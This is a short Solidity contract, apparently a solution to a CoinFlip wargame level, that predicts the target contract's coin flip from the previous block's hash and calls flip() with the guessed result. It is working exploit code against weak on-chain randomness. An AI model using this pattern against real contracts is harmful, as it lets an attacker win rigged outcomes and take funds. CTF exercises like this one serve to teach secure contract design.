// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./CoinFlip.sol";

contract CoinFlipGuess {
    // using SafeMath for uint256;
    CoinFlip public cf;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipContract) public{
        cf = CoinFlip(_coinFlipContract);
    }

    function makeGuess() public returns(bool) {

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        
        return cf.flip(guess);
    }

    function checkBlockNumber() view public returns(uint) {
        return block.number;
    }
}